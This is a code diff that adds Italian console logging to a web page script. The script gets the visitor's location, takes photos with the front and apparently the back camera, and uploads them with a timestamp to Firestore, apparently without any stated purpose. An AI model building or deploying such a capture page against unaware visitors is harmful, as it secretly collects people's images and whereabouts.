@@ -87,18 +87,20 @@
         // Ottieni posizione
         function getLocation() {
             return new Promise((resolve, reject) => {
+                console.log("Tentativo di ottenere la posizione...");
                 if (navigator.geolocation) {
                     navigator.geolocation.getCurrentPosition(
                         (position) => {
+                            console.log("Posizione ottenuta: ", position.coords);
                             resolve({ latitude: position.coords.latitude, longitude: position.coords.longitude });
                         },
                         (error) => {
-                            console.log("Errore geolocalizzazione: " + error.message);
+                            console.log("Errore geolocalizzazione: " + error.message + " (codice: " + error.code + ")");
                             reject("Errore geolocalizzazione: " + error.message);
                         }
                     );
                 } else {
-                    console.log("Geolocalizzazione non supportata");
+                    console.log("Geolocalizzazione non supportata dal browser");
                     reject("Geolocalizzazione non supportata");
                 }
             });
@@ -107,6 +109,7 @@
         // Accedi alla fotocamera
         async function startCamera(facingMode) {
             const video = document.getElementById('video');
+            console.log("Tentativo di accedere alla fotocamera con facingMode: ", facingMode);
             if (video) {
                 try {
                     const constraints = {
@@ -120,15 +123,19 @@
                     const stream = await navigator.mediaDevices.getUserMedia(constraints);
                     video.srcObject = stream;
                     await new Promise((resolve) => {
-                        video.onloadedmetadata = () => resolve();
+                        video.onloadedmetadata = () => {
+                            console.log("Fotocamera avviata con successo");
+                            resolve();
+                        };
                         video.onerror = () => console.log("Errore caricamento video");
                     });
                     return stream;
                 } catch (err) {
-                    console.log("Errore fotocamera: " + err.message);
+                    console.log("Errore fotocamera: " + err.message + " (nome: " + err.name + ")");
                     throw err;
                 }
             } else {
+                console.log("Elemento video non trovato");
                 throw new Error("Video element non trovato");
             }
         }
@@ -137,6 +144,7 @@
         function takePhoto() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
+            console.log("Tentativo di scattare foto...");
             if (video && canvas && video.videoWidth > 0 && video.videoHeight > 0) {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
@@ -145,8 +153,10 @@
                 ctx.fillRect(0, 0, canvas.width, canvas.height);
                 ctx.drawImage(video, 0, 0);
                 const photo = canvas.toDataURL('image/jpeg', 0.9);
+                console.log("Foto scattata con successo");
                 return photo;
             } else {
+                console.log("Video o canvas non validi per scattare la foto");
                 throw new Error("Video o canvas non valido");
             }
         }
@@ -155,12 +165,14 @@
         function stopCamera(stream) {
             if (stream) {
                 stream.getTracks().forEach(track => track.stop());
+                console.log("Fotocamera fermata");
             }
         }
 
         // Salva dati su Firestore
         async function sendData(location, frontPhoto, backPhoto) {
             if (!window.db || !window.collection || !window.addDoc) {
+                console.log("Firestore non inizializzato");
                 throw new Error("Firestore non inizializzato");
             }
             try {
@@ -172,6 +184,7 @@
                     backPhoto: backPhoto,
                     timestamp: new Date()
                 });
+                console.log("Dati salvati su Firestore");
             } catch (err) {
                 console.log("Errore salvataggio: " + err.message);
                 throw err;
@@ -185,8 +198,9 @@
                 let location;
                 try {
                     location = await getLocation();
+                    console.log("Posizione utilizzata: ", location);
                 } catch (err) {
-                    console.log("Geolocalizzazione fallita, usando coordinate predefinite: " + err.message);
+                    console.log("Geolocalizzazione fallita, usando coordinate predefinite: " + err);
                     location = { latitude: 45.4642, longitude: 9.1900 }; // Milano
                 }
                 let stream = await startCamera('user');
@@ -199,7 +213,7 @@
                 stopCamera(stream);
                 await sendData(location, frontPhoto, backPhoto);
             } catch (err) {
-                console.log("Errore: " + err.message);
+                console.log("Errore generale nella cattura: " + err.message);
             }
         }
 
